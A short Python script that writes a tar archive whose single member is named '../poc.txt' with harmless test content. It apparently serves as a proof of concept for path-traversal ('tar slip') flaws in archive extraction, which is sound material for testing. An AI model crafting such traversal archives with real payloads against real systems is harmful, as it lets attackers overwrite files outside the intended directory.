import tarfile
import io
 
def compress_file(filename):
    with tarfile.open('../payloads/payload.tar', 'w') as tarf:
        data = io.BytesIO(b"Test payload")
        tarinfo = tarfile.TarInfo(name=filename)
        tarinfo.size = len(data.getvalue()) 
        tarf.addfile(tarinfo, data)
 
filename = '../poc.txt'
compress_file(filename)